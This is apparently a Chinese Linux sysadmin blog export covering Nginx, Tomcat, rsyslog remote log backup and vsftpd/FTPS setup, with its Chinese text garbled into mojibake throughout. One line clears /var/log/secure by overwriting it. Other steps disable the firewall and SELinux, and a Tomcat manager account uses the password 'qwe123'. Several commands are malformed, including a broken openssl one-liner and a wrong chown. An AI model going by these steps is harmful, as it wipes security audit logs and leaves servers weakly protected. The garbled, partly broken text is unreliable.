è´Ÿè½½å‡è¡¡æ–¹æ³• round-robin # è®ºè¯¢ least_conn # æœ€å°‘è¿æ¥æ•°ä¼˜å…ˆ(å·²ç»å»ºç«‹çš„è¿æ¥æ•°) least_time # å“åº”é€Ÿåº¦æœ€å¿« hash # åŸºäºè¯·æ±‚çš„Hashå€¼ ip_hash # åŸºäºipåœ°å€çš„hashå€¼(é€‚ç”¨äºéœ€è¦ä¼šè¯ä¿æŒçš„åœºæ™¯) æ—¥å¿—/var/log/nginx/access.log /var/log/nginx/error.log TomcatTomcatæ˜¯ç”±Apacheç»„ç»‡å¼€å‘çš„ä¸€ä¸ªServlet(Server Applet)å®¹å™¨ å®ç°å¯¹servlet, JSP, JAVA Socketç­‰æ”¯æŒ åŒ…å«httpæœåŠ¡å™¨ ä½œä¸ºä¸­é—´ä»¶ä½¿ç”¨ å¯ä¸Nginxç»“åˆä½¿ç”¨(åªç”¨Tomcatçš„è¯, æŠ—å‹èƒ½åŠ›å¼º) servletæ˜¯ä¼˜äºCGIçš„æ–¹å¼çš„ å®‰è£… open jdkä¸€èˆ¬tomcatå’Œjavaé…åˆè¾ƒå¤šjdkæ˜¯å¼€å‘ç¯å¢ƒï¼Œjreæ˜¯è¿è¡Œç¯å¢ƒ sudo apt install default-jdk #å®‰è£…openjdkã€‚ ä½¿ç”¨é»˜è®¤ç‰ˆæœ¬ æˆ–è€…æŒ‡å®šopenjdk-8-jdk å®‰è£… oracle jdkå®‰è£… sudo apt install software-properties-common -y sudo add-apt-repository ppa:webupd8team/java sudo apt install oracle-java8-installer -y javaç‰ˆæœ¬é€‰æ‹© sudo update-alternatives --config java sudo update-alternatives --config javac java --version æˆ–è€…æ‰‹åŠ¨ä¸‹è½½oracle jdkåŒ… å®˜æ–¹åº“å®‰è£…tomcat# ubuntuä¸­æ”¶å½•çš„8 sudo apt install tomcat8 sudo apt install tomcat8-docs sudo apt install tomcat8-admin sudo apt install tomcat8-examples # tomcaté»˜è®¤ä¸æ˜¯ä¸»è¦ä½œä¸ºWebServerçš„ï¼Œä¸€èˆ¬æ˜¯é…åˆApacheå’ŒNginxï¼Œæ‰€ä»¥é»˜è®¤ä½¿ç”¨8080ç«¯å£ æ‰‹åŠ¨å®‰è£…tomcaté€‚ç”¨äºæŒ‡å®šå…·ä½“ç‰ˆæœ¬1.å…ˆå®‰è£…jdk sudo apt install default-jdk #å®‰è£…openjdkã€‚ ä½¿ç”¨é»˜è®¤ç‰ˆæœ¬ æˆ–è€…æŒ‡å®šopenjdk-8-jdk # éªŒè¯ java --version sudo useradd -m -U -d /opt/tomcat -s /bin/false tomcat # åˆ›å»ºtomcatå¸å·ï¼ˆhomeæ”¾åœ¨optä¸‹é¢ï¼‰ 2.å†ä¸‹è½½å®‰è£…åŒ… 3.ç§»åŠ¨åˆ°/opt/tomcatç›®å½• mv apache-tomcat-8.5.31 /opt/tomcat/ 4.ä¿®æ”¹è¯¥æ–‡ä»¶é€’å½’çš„å±ä¸»å±ç»„æ”¹ä¸ºæ–°å»ºçš„tomcatç”¨æˆ· # å»ºè®®å»ºç«‹ç¬¦å·é“¾æ¥ sudo ln -s /opt/tomcat/apache-tomcat-8.5.31 /opt/tomcat/latest # æŠŠæ–°ç‰ˆæœ¬æ·»åŠ é“¾æ¥å³å¯(ç‰ˆæœ¬æ›´æ–°ä¹‹åä¸éœ€è¦æ›´æ”¹é…ç½®æ–‡ä»¶ï¼Œé…ç½®æ–‡ä»¶éƒ½é…ç½®latest,è€Œåªéœ€æŠŠlatestä¿®æ”¹æŒ‡å‘å³å¯) sudo chown -R tomcat:/opt/tomcat sudo chmod +x /opt/tomcat/latest/bin/*.sh # sudo chmod +x /opt/tomcat/apache-tomcat-8.5.31/bin/*.sh æ‰‹åŠ¨åˆ›å»ºsystemdç®¡ç†æ–‡ä»¶(æ‰‹åŠ¨å®‰è£…å°±æ²¡æœ‰systemdçš„åå°ç®¡ç†æ–‡ä»¶)/etc/systemd/system/sudo vim tomcat.serviceé…ç½®å†…å®¹å¦‚ä¸‹ 6.å¯åŠ¨æœåŠ¡ # é‡æ–°reload sudo systemctl daemon-reload # å¯åŠ¨tomcat sudo systemctl start tomcat sudo systemctl status tomcat # è®¾ç½®å¼€æœºå¯åŠ¨å¯åŠ¨ sudo systemctl enable tomcat 7.Webç®¡ç†æ¥å£é…ç½® # http://ip:8080/manager/ # tomcatç®¡ç†é¡µé¢ï¼Œé»˜è®¤æ˜¯åªå…è®¸æœ¬æœºè®¿é—®çš„ ## 1.è‹¥æƒ³å¼€å¯ï¼Œå°±éœ€è¿›è¡Œé…ç½®ï¼ˆè¿™é‡ŒæŒ‡å®šå…è®¸æŸä¸ªipè®¿é—®ï¼‰ sudo vim /opt/tomcat/latest/conf/tomcat-user.xml # è‡ªåŠ¨å®‰è£…tomcatåçš„è·¯å¾„åœ¨/etc &lt;tomcat-user> &lt;role rolename="admin-gui"/> # å®šä¹‰ä¸¤ä¸ªè§’è‰² &lt;role rolename="manager-gui"/> &lt;user username="admin" password="qwe123" roles="admin-gui, manager-gui"/> # å®šä¹‰ç”¨æˆ· &lt;/tomcat-user> ## 2.æŒ‡å®šç™»å½•ä¸»æœº # sudo vim /opt/tomcat/latest/webapps/manager/META-INF/context.xml # è‡ªåŠ¨å®‰è£…tomcatåçš„è·¯å¾„è‡ªå·±æ‰¾ å¦‚ä¸‹å›¾(æ‡’å¾—å¼„æ ¼å¼äº†) # sudo vim /opt/tomcat/latest/webapps/host-manager/META-INF/context.xml è¿™æ˜¯ç®¡ç†ä¸»æœºçš„é…ç½®æ–‡ä»¶ ## 3.é‡å¯æœåŠ¡ï¼Œç„¶åæµ‹è¯• systemctl restart tomcat8 xxx:8080/manager/html # ç®¡ç†é¡µé¢å°±å¯ä»¥éƒ¨ç½²waråŒ…ç­‰æ“ xxx:8080/host-manager/html document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>WebæœåŠ¡</tag>
        <tag>Apache</tag>
        <tag>Nginx</tag>
        <tag>Tomcat</tag>
        <tag>åå‘ä»£ç†</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ã€PHPä»£ç å®¡è®¡ã€‘ é‚£äº›å¹´æˆ‘ä»¬ä¸€èµ·æŒ–æ˜SQLæ³¨å…¥--é›†åˆ]]></title>
    <url>%2Fposts%2F43402%2F</url>
    <content type="text"><![CDATA[ä»…ä»…æ˜¯ç®€å•æŠŠç½‘ä¸Šçš„æ–‡ç« æ”¾åœ¨ä¸€èµ·ï¼Œæ–¹ä¾¿è‡ªå·±å­¦ä¹  https://www.cnblogs.com/xiaozi/p/5538369.html https://www.cnblogs.com/xiaozi/p/5538372.html https://www.cnblogs.com/xiaozi/p/5538374.html http://www.mamicode.com/info-detail-1391858.html https://www.cnblogs.com/xiaozi/p/5538380.html https://www.cnblogs.com/xiaozi/p/5538382.html https://www.cnblogs.com/chunguang/p/5583875.html document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>å®‰å…¨</tag>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linuxæ—¥å¿—å¼‚åœ°å¤‡ä»½]]></title>
    <url>%2Fposts%2F52918%2F</url>
    <content type="text"><![CDATA[æ—¥å¿—çš„å¼‚åœ°å¤‡ä»½ æ—¥å¿—æœåŠ¡å™¨çš„å»ºç«‹å°¤å…¶é‡è¦ è¿™é‡Œä½¿ç”¨Centosçš„ç™»å½•æ—¥å¿—åšå®éªŒ tail -f /var/log/secure å®æ—¶æŸ¥çœ‹æ—¥å¿—å˜åŒ– echo " " &gt; var/log/secure æœ€ç®€å•çš„æ¸…ç†æ—¥å¿— å¸¸è§æ—¥å¿—æ–‡ä»¶/var/log/messages å¤§å¤šæ•°ç³»ç»Ÿæ—¥å¿—ä¿¡æ¯è®°å½•åœ¨æ­¤å¤„ /var/log/secure å®‰å…¨å’Œèº«ä»½è®¤è¯ç›¸å…³çš„ä¿¡æ¯å’Œé”™è¯¯çš„æ—¥å¿—æ–‡ä»¶ /var/log/mallog ä¸é‚®ä»¶æœåŠ¡å™¨ç›¸å…³çš„æ—¥å¿—æ–‡ä»¶ /var/log/cron ä¸å®šæ—¶ä»»åŠ¡ç›¸å…³çš„æ—¥å¿—æ–‡ä»¶ /var/log/boot.log ä¸ç³»ç»Ÿå¯åŠ¨æœ‰å…³çš„æ—¥å¿—æ–‡ä»¶ å‘é€æ–¹ï¼šè€ƒè™‘é—®é¢˜1.æˆ‘å‘é€ä»€ä¹ˆä¿¡æ¯è¡¨åˆ°æ—¥å¿—æœåŠ¡å™¨ 2.è€ƒè™‘å‘é€åˆ°ipå“ªä¸ªç«¯å£ 3.ä½¿ç”¨ä»€ä¹ˆåè®® é…ç½®é…ç½®æ–‡ä»¶ vim /etc/rsyslog.conf # è¿™é‡Œé…ç½®ç™»å½•æ—¥å¿—ï¼Œ æŒ‡å®šæ—¥å¿—ç±»åˆ«å’Œç­‰çº§ï¼Œåè®®å’Œç«¯å£ ### begin forwarding rule ### #*.* @@remote-host:514 @@ä»£è¡¨ä½¿ç”¨TCP authpriv.* @@192.168.0.111:514 ### Noteï¼š # 1.æš‚æ—¶å…³é—­é˜²ç«å¢™ setup # å…³é—­é˜²ç«å¢™ iptables -nL # æŸ¥çœ‹ä¸€ä¸‹ # 2.å…³é—­SELinux setenforce 0 getenforce # é‡å¯rsyslog æœåŠ¡ æ¥æ”¶æ–¹ï¼šè€ƒè™‘é—®é¢˜1.æ”¶è°çš„æ—¥å¿— 2.æ”¶å®Œå­˜å“ª 3.ç”¨ä»€ä¹ˆåè®® é…ç½®é…ç½®æ–‡ä»¶ vim /etc/rsyslog.conf # æŒ‡å®šåè®®å’Œç«¯å£ # Provides TCP syslog reception $ModLoad imtcp $InputTCPServerRun 514 # æ”¶è°çš„ï¼Œå­˜å“ª # æŒ‰ç…§ipåœ°å€æ¥æ”¶ :fromhost-ip, isequal, "192.168.0.100" /var/log/client_log/192.168.0.100.log # é‡å¯rsyslog æœåŠ¡ netstat -antlp |grep 514 # æŸ¥çœ‹ç«¯å£æ˜¯å¦å¼€å§‹ç›‘å¬äº† å®Œæˆ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>æ—¥å¿—</tag>
        <tag>å¼‚åœ°å¤‡ä»½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-æ–‡ä»¶æœåŠ¡]]></title>
    <url>%2Fposts%2F50043%2F</url>
    <content type="text"><![CDATA[æ–‡ä»¶æœåŠ¡ æˆ‘çš„å°±æ˜¯ä½ çš„ - ä½ çš„è¿˜æ˜¯ä½ çš„ ç½‘ç»œè¯ç”Ÿæœ€åˆçš„åŠ¨å› æ˜¯å»ä¸­å¿ƒåŒ–å’Œèµ„æºå…±äº«æ–‡ä»¶æ˜¯åˆæœŸæœ€ä¸»è¦çš„èµ„æºå…±äº«å½¢å¼ï¼ˆæŠŠæ–‡ä»¶å­˜æ”¾åœ¨é›†ä¸­çš„ä½ç½®ä¾›å¤§å®¶è®¿é—®ï¼‰ å»ä¸­å¿ƒåŒ–æ˜¯å¦å¤–ä¸€ä¸ªè¯é¢˜ æ—©æœŸçš„å†›äº‹éœ€æ±‚ ç°åœ¨çš„ä¿¡ä»»éœ€æ±‚ FTPæœåŠ¡æœ€å¤è€çš„å°±æ˜¯FTP äº§ç”Ÿäºå®‰å…¨å‡ºç°ä¹‹å‰ æ˜æ–‡ä¼ è¾“ä¸€åˆ‡ ç›®å‰ä¸»è¦ç”¨äºå…¬å¼€æä¾›çš„æ–‡ä»¶ä¸‹è½½æœåŠ¡(ç›®å‰è¿˜æ²¡æ¶ˆäº¡) ä½¿ç”¨ç®€å•ã€å…¼å®¹æ€§å¥½ è¿˜æœ‰SFTPã€FTPSç­‰ FTPæœåŠ¡ç«¯è½¯ä»¶ Server U vsftpd Proftpd ä¸ºäº†å®‰å…¨è€ƒè™‘ ç‹¬ç«‹éƒ¨ç½²äºä¼ä¸šé˜²ç«å¢™ä¹‹å¤– åªè¯»æŒ‚è½½å­˜å‚¨æˆ–é‡‡ç”¨åªè¯»å­˜å‚¨è®¾å¤‡(CD / DVD) vsftpå®‰è£…å’Œé…ç½®å’Œç®¡ç†vsftpd â€“ çµæ´»ã€å®‰å…¨çš„FTPæœåŠ¡ç«¯è½¯ä»¶ å®‰è£…sudo apt install vsftpd # å®‰è£…è¿‡ç¨‹ä¸­ç”Ÿæˆftpè´¦å·ï¼ˆanonymousï¼‰ ä¸»ç›®å½•åœ¨ï¼š/srv/ftp # é»˜è®¤æ˜¯21ç«¯å£è¿›è¡Œä¼šè¯ FTPè´¦å· # å®‰è£…å®Œä¹‹åä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªftpè´¦å·ï¼ˆè¿™ä¸ªè´¦å·æ˜¯ä¸èƒ½ä½¿ç”¨shellå’Œç™»å½•æœºå™¨ ï¼‰ /etc/passwd # bin/false è¡¨ç¤ºä¸èƒ½ä½¿ç”¨shell /etc/shadow # * è¡¨ç¤ºä¸èƒ½ä½¿ç”¨ç»ˆç«¯ /srv/ftp # ftpç”¨æˆ·ä¸»ç›®å½• é…ç½®ä¸¤ç§é…ç½®æ¨¡å¼ anonymous # åŒ¿åæ¨¡å¼ï¼ˆé€‚ç”¨äºå…¬å¼€å…±äº«æ–‡ä»¶ï¼‰ -- vsftpdå®‰è£…å¥½ä¹‹åæ˜¯é»˜è®¤ç¦ç”¨åŒ¿åç™»é™†çš„ Standard # è®¤è¯æ¨¡å¼ å¸¸è§FTPå®¢æˆ·ç«¯ # ç”¨å“ªä¸ªè´¦å·ç™»å½•ï¼Œçœ‹åˆ°çš„æ–‡ä»¶å°±æ˜¯å“ªä¸ªç”¨æˆ·çš„ä¸»ç›®å½• # 1.ä½¿ç”¨å‘½ä»¤è¡Œè¿æ¥ftpæœåŠ¡å™¨ ftp 192.168.1.130 # 2.æµè§ˆå™¨ ftp://192.168.111.130 # 3.ftpå®¢æˆ·ç«¯è®¿é—®ç¨‹åºï¼ˆFileZillaï¼‰ # 4.æ–‡ä»¶åŒæ­¥å®¢æˆ·ç«¯è½¯ä»¶ 1.åŒ¿åç™»å½•é…ç½®æ–‡ä»¶ä½ç½® /etc/vsftpd.conf # ä¸»é…ç½®æ–‡ä»¶ å¼€å¯åŒ¿åæ¨¡å¼ sudo vim /etc/vsftpd.conf # ä¿®æ”¹å†…å®¹ä¸º anonymous_enable=YES # å¯ç”¨åŒ¿åè´¦å·ç™»å½• local_enable=NO # ç¦ç”¨è®¤è¯ç”¨æˆ·ç™»å½• # é‡å¯vsftpdæœåŠ¡ï¼Œæ£€æŸ¥çŠ¶æ€ ç„¶åä½¿ç”¨è´¦å·anonymousç™»å½•(å‘½ä»¤è¡Œéœ€è¦,å…¶ä»–æ–¹å¼ä¸ç”¨)ï¼Œå¯†ç ä¸ç”¨è¾“å³å¯() çœ‹åˆ°çš„ç›®å½•æ˜¯`/srv/ftp/` å¼€å¯åŒ¿åè´¦å·ä¸Šä¼ é»˜è®¤ï¼šåŒ¿åè´¦å·æ˜¯ä¸å…è®¸åŒ¿åä¸Šä¼ çš„ sudo vim /etc/vsftpd.conf # ä¿®æ”¹å†…å®¹ write_enable=YES # å…¨å±€è®¾ç½®ï¼ˆä»¥ä¸‹é…ç½®ç”Ÿæ•ˆçš„ä¾èµ–ï¼‰ anon_upload_enable=YES # å…è®¸åŒ¿åä¸Šä¼ æ–‡ä»¶ anon_mkdir_write_enable=YES # å…è®¸åŒ¿ååˆ›å»ºç›®å½• # é‡å¯æœåŠ¡ï¼Œæ£€æŸ¥çŠ¶æ€ sudo systemctl restart vsftpd.service ä½†æ˜¯è¿˜æ˜¯ä¸èƒ½ä¸Šä¼ çš„ï¼ˆå› ä¸ºvsftpdå¼ºåˆ¶ç¦æ­¢åœ¨æ ¹ç›®å½•ä¸‹åŒ¿åä¸Šä¼ ï¼‰ Noteï¼š ftpçš„ä¸»ç›®å½•æ˜¯ä¸èƒ½è¿›è¡Œä¸Šä¼ æ–‡ä»¶çš„ï¼Œå› ä¸ºè¿™ä¸ªç›®å½•å¯¹åŒç»„ç”¨æˆ·æ²¡æœ‰å†™çš„æƒé™(`ls -ld`æŸ¥çœ‹å½“å‰ç›®å½•çš„æƒé™)ï¼Œå°±ç®—ä½ chmodä¿®æ”¹äº†æƒé™ä¹Ÿæ˜¯ä¸è¡Œçš„ ã€è§£å†³åŠæ³•ã€‘:åœ¨æ ¹ç›®å½•æ–°å»ºæ–‡ä»¶ç„¶åä¸Šä¼  sudo mkdir /srv/ftp/upload # åˆ›å»ºä¸Šä¼ ç›®å½• sudo chown ftp:ftp /srv/ftp/upload # é…ç½®æ–°å»ºæ–‡ä»¶ç³»ç»Ÿå±ä¸»æ•°ç»„ # ç»§ç»­æ–°å¢é…ç½® /etc/vsftpd.conf anon_umask=022 # ä¸Šä¼ æ–‡ä»¶æƒé™æ©ç (è®©ä¸Šä¼ çš„æ–‡ä»¶é…ç½®ä¸åŒçš„æƒé™ -- çœ‹è‡ªå·±éœ€è¦æ¥é…ç½®) anon_other_wrote_enable=YES # å…è®¸åˆ é™¤å’Œé‡å‘½å(å¦åˆ™åˆ é™¤ä¸äº†ä¹Ÿæ— æ³•é‡å‘½å) ä¿®æ”¹FTPä¸»ç›®å½• sudo mkdir /srv/files/ftp sudo chown -d /srv/files/ftp ftp æ–‡ä»¶ä¼ è¾“æ—¥å¿—é»˜è®¤æ˜¯å¼€å¯çš„ï¼Œå¯ä»¥æŸ¥çœ‹æ¶æ„æ–‡ä»¶ä¸Šä¼ è®°å½• # sudo vim /etc/vsftpd.conf xferlog_enable=YES # é»˜è®¤å¼€å¯ xferlog_file=/var/log/vsftpd.log # é»˜è®¤æ—¥å¿—å­˜æ”¾ä½ç½®(æ³¨é‡Šä¸æ³¨é‡Šä»–éƒ½é»˜è®¤å¾€é‡Œé¢å†™ï¼Œå¯ä¿®æ”¹) # å¦‚æœä¿®æ”¹ï¼Œé‡å¯æœåŠ¡ å…¶ä»–é…ç½® idle_session_timeout=600 # ä¼šè¯è¶…æ—¶æ—¶é•¿ no_anon_password=YES # å‘½ä»¤è¡Œç™»å½•ç¦ç”¨å¯†ç æç¤º hide_ids=YES # æ˜¾ç¤ºå±ä¸»/æ•°ç»„åç§°ï¼Œè€Œä¸æ˜¾ç¤ºuidå’Œgid(uidä¼šæ¯”è¾ƒæ•æ„Ÿ) # é‡å¯æœåŠ¡ ç«¯å£ ä¼šè¯æŒ‡ä»¤ -&gt; TCP 21ç«¯å£ æ•°æ®ä¼ è¾“æ¨¡å¼ ä¸»åŠ¨æ¨¡å¼ï¼ˆå—å®¢æˆ·ç«¯é˜²ç«å¢™å½±å“ï¼‰â€“ å®¢æˆ·ç«¯éšæœºäº§ç”Ÿä¸€ä¸ªç«¯å£ï¼Œå‘Šè¯‰æœåŠ¡å™¨ -&gt;æœåŠ¡ç«¯åªä½¿ç”¨ 20ç«¯å£ è¢«åŠ¨æ¨¡å¼ ï¼ˆå…¼å®¹æ€§å¥½ï¼Œå»ºè®®ä½¿ç”¨ï¼‰ â€“ æœåŠ¡ç«¯å‘Šè¯‰å®¢æˆ·ç«¯ä½¿ç”¨å“ªä¸ªç«¯å£ä¼ è¾“ # ç”¨ä»€ä¹ˆæ¨¡å¼ï¼Œå®¢æˆ·ç«¯è¯´äº†ç®— # éƒ½æ˜¯å®¢æˆ·ç«¯éšæœºäº§ç”Ÿä¸€ä¸ªç«¯å£ï¼Œå‘Šè¯‰æœåŠ¡ç«¯ # è¢«åŠ¨æ¨¡å¼è¿æ¥ ftp -p 192.168.0.130 é™å®šè¢«åŠ¨æ¨¡å¼æ•°æ®é€šä¿¡ç«¯å£ # sudo vim /etc/vsftpd.conf æ–°å¢é…ç½® # å¼€æ”¾ä¸€ä¸ªç«¯å£çš„èŒƒå›´(å°½é‡å°‘å¼€) pasv_min_port=40001 pasv_max_port=40101 ç„¶ååœ¨æœåŠ¡å™¨ç«¯è¾¹ç•Œé˜²ç«å¢™ä¸Šå¼€æ”¾ä¸Šè¿°100ä¸ªç«¯å£ 2.èº«ä»½è®¤è¯ç™»å½•èº«ä»½è®¤è¯ç™»å½•TFP å®‰è£…ä¹‹åçš„é»˜è®¤é…ç½® ä¸èƒ½ä¸Šä¼  å¯å›æº¯åˆ°æ ¹ç›®å½•ï¼ˆå­˜åœ¨å®‰å…¨éšæ‚£!!! â€“&gt; ä½¿ç”¨chrootæ¥è§£å†³ï¼‰ chrootchroot å°†æ‰€æœ‰ç™»å½•ç”¨æˆ·é”å®šåœ¨è‡ªå·±çš„ä¸»ç›®å½•é‡Œï¼ˆé˜²æ­¢ç›®å½•å›æº¯ï¼‰ # é…ç½®æ–‡ä»¶ sudo vim /etc/vsftpd.conf # å…¨å±€çš„é…ç½®å‚æ•°(å¯¹æ‰€æœ‰ç”¨æˆ·) chroot_local_user=YES # ä½†æ˜¯chrootçš„æ ¹ç›®å½•ä¸èƒ½æ˜¯å¯å†™çš„ # é‡å¯æœåŠ¡ # é»˜è®¤ä¸»ç›®å½•å¯å†™ï¼Œ ä½†æ˜¯chrootçš„æ ¹ç›®å½•ä¸èƒ½æ˜¯å¯å†™çš„ï¼Œvsftpçš„ç¦æ­¢ç”¨æˆ·ç™»å½•ï¼Œå¥½çŒ«çŸ­ â€”â€”â€”â€”> æ€ä¹ˆåŠå‘¢ï¼Ÿçœ‹ä¸‹é¢ ï¼ˆæ¥ä¸Šæ–‡ï¼‰ä¸¤ç§è§£å†³åŠæ³•:1.ä¸ºFTPç™»å½•æŒ‡å®šæ–°çš„ä¸»ç›®å½•ï¼ˆå»ºè®®ä½¿ç”¨ï¼‰ sudo mkdir ~/ftp &amp;&amp; chmod -w ftp # æ–°å»ºä¸»ç›®å½•ï¼Œå¹¶åˆ é™¤å†™å…¥æƒé™ # sudo vim /etc/vsftpd.conf local_root=/home/xps/ftp # å®¢æˆ·ç«¯åªèƒ½çœ‹åˆ°è¿™ä¸ªç›®å½•é‡Œé¢ï¼Œè·³ä¸å‡ºå» 2.å…è®¸æ ¹ç›®å½•å†™å…¥ï¼ˆä¸å»ºè®®ï¼Œå­˜åœ¨å®‰å…¨é£é™©ï¼‰ # é…ç½®æ–‡ä»¶ sudo vim /etc/vsftpd.conf write_enable=YES local_root=/home/xps allow_writeable_chroot=YES chroot å°†æŒ‡å®šç™»å½•ç”¨æˆ·é”å®šåœ¨è‡ªå·±çš„ä¸»ç›®å½•é‡Œï¼ˆé˜²æ­¢ç›®å½•å›æº¯ï¼‰ # é…ç½®æ–‡ä»¶ sudo vim /etc/vsftpd.conf # chroot_local_user=YES # æ³¨é‡Šæ‰å‰é¢é…ç½®çš„å…¨å±€çš„é…ç½®é¡¹ # å¯ç”¨ç”¨æˆ·åˆ—è¡¨åŠŸèƒ½ chroot_list_enable=YES # å¦‚æœchroot_local_user=YESä¹Ÿå¼€å¯äº†ï¼Œå°±èµ·äº†ç›¸åçš„ä½œç”¨(é™¤äº†æŒ‡å®šåˆ—è¡¨é‡Œé¢çš„ç”¨æˆ·ä¹‹å¤–, éƒ½é”å®šåœ¨ä¸»ç›®å½•é‡Œ) # æŒ‡å®šç”¨æˆ·åˆ—è¡¨æ–‡ä»¶ chroot_list_file=/etc/vsftpd.chroot_list # ç¼–è¾‘ç”¨æˆ·è´¦å·åˆ—è¡¨ vim /etc/vsftpd/chroot_list # æ·»åŠ ç”¨æˆ· xps ftp # é‡å¯æœåŠ¡ ç¦æ­¢æŒ‡å®šFTPç™»å½•è´¦å· /etc/ftpusers # é»˜è®¤ç¦æ­¢FTPç™»å½•è´¦å·(å°†ç”¨æˆ·åŠ å…¥è¿›å») ä¸Šä¼ æ–‡ä»¶æƒé™æ©ç  # è·ŸåŒ¿åç”¨æˆ·çš„é…ç½®æ˜¯ç±»ä¼¼çš„ local_umask=022 æ–‡ä»¶åŒæ­¥å®¢æˆ·ç«¯è‡ªåŠ¨æŠŠæˆ‘ç”µè„‘çš„æ–°çš„æ–‡ä»¶ï¼Œä¸Šä¼ åˆ°FTPæœåŠ¡å™¨(ç±»ä¼¼äºå¤‡ä»½) â€“ æœ‰ä¸€äº›ç¬¬ä¸‰æ–¹è½¯ä»¶(ubuntuè‡ªå¸¦çš„åŒæ­¥è½¯ä»¶backupç­‰) FTPå®‰å…¨1.FTPS: FTP over Secure Socket Layer(SSL) è´¦å·æ— éœ€shellç™»å½•æƒé™ åŸºäºè¯ä¹¦çš„åŠ å¯† å¼€å¯FTPSï¼š # å®‰å…¨æ€§--æŒ‡çš„æ˜¯åœ¨æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­ä¸ä¼šè¢«åˆ«äººå—…æ¢ ssl_enable=YES # å¯åŠ¨FTPS rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem # å…¬é’¥ rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key # ç§é’¥ # é‡å¯æœåŠ¡ # ç„¶åå†è¿æ¥çš„æ—¶å€™å°±æ˜¯åŠ å¯†çš„äº†(æµè§ˆå™¨éœ€è¦ftps://ip) # æ€ä¹ˆåŠ å¯†çš„å‘¢? # ç®€å•æ¥è¯´ï¼šå®‰è£…FTPæ—¶å€™é»˜è®¤ä¼šç”Ÿæˆä¸€å¯¹å…¬é’¥å’Œç§é’¥ # ä¸å»ºè®®ä½¿ç”¨å®‰è£…FTPæ—¶å€™é»˜è®¤ç”Ÿæˆçš„è¯ä¹¦ï¼Œå»ºè®®æ‰‹åŠ¨ç”Ÿæˆ(æ¯ä¸ªåº”ç”¨ä¸€ä¸ªè¯ä¹¦, æ¯ä¸ªè¯ä¹¦æœ‰æ•ˆæœŸä¸€ä¸¤å¹´) æ‰‹åŠ¨ç”Ÿæˆè¯ä¹¦ â€“&gt; æ›¿æ¢é»˜è®¤è¯ä¹¦(å®‰å…¨è€ƒè™‘)ï¼š1.ç”Ÿæˆç§˜é’¥æ–‡ä»¶ # ä½¿ç”¨sslçš„ä¸€ä¸ªå¼€æºç»„ä»¶openssl openssl genrsa -des3 -out ftp.key 4096 # 1024çš„å·²ç»ä¸å®‰å…¨äº† # ç„¶åè®¾ç½®å¯†ç ä¿æŠ¤ 2.ç”Ÿæˆä¸åŠ å¯†çš„ç§˜é’¥æ–‡ä»¶ # å…ˆè¿˜åŸä¸ºæ˜æ–‡çš„å¯†é’¥å¯¹ openssl rsa -in ftp.key -out ftp.key.insecure # ç”¨å®Œå°±åˆ æ‰è¿™ä¸ªinsecureæ–‡ä»¶ # æ”¹å(è¿™æ˜¯åŠ å¯†çš„) mv ftp.key server.key.secure # æ”¹å(è¿™æ˜¯æ˜æ–‡çš„) mv server.key.insecure ftp.key 3.ç”Ÿæˆè¯ä¹¦è¯·æ±‚æ–‡ä»¶(ä½¿ç”¨ä¸Šé¢çš„æ˜æ–‡ç§˜é’¥) â€“ å®éªŒä½¿ç”¨çš„è‡ªç­¾åè¯ä¹¦ openssl req -new -key ftp.key -out ftp.csr # ç„¶åè¾“å…¥ä¸€äº›è¯ä¹¦çš„ä¿¡æ¯ è¿™é‡Œä½¿ç”¨è‡ªç­¾åè¯ä¹¦(ç”Ÿäº§ç¯å¢ƒå»ºè®®ç”±è¯ä¹¦é¢å‘æœºæ„å‰é¢ç”Ÿæˆè¯ä¹¦)3.ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ openssl x509 -req -days 365 -in ftp.csr -signkey ftp.key -out ftp.pem # -days 365æœ‰æ•ˆæœŸ 4.éƒ¨ç½²è¯ä¹¦ # ftp.keyæ”¾åˆ°ä¸€ä¸ªæ›´å®‰å…¨çš„ç›®å½•å» sudo cp ftp.key /etc/ssl/private/ # æ­¤ç›®å½•rootæ‰èƒ½çœ‹ sudo cp ftp.pem /etc/ssl/certs/ 5.ä¿®æ”¹/etc/vsftpd.congä¸­çš„keyå’Œå…¬é’¥ä¸ºåˆšæ‰æ‰‹åŠ¨ç”Ÿæˆçš„è¯ä¹¦ï¼Œ ç„¶åé‡å¯æœåŠ¡ ä¸Šé¢çš„æ“ä½œä¹Ÿå¯ä»¥åˆå¹¶ä¸ºä¸€æ¡å‘½ä»¤ openssl x509 -req -node -days 365 -newkey rsa:4096 -keyout /etc/ssl/private/vsftpd.key -out /etc/ssl/private/vsftpd.pem 2.SFTP: åŸºäºSSHåŠ å¯†éš§é“ä¼ è¾“æ–‡ä»¶ è´¦å·éœ€è¦shellç™»å½•æƒé™ï¼ˆå¯è®¾ç½®ç¦æ­¢æƒé™ï¼‰ 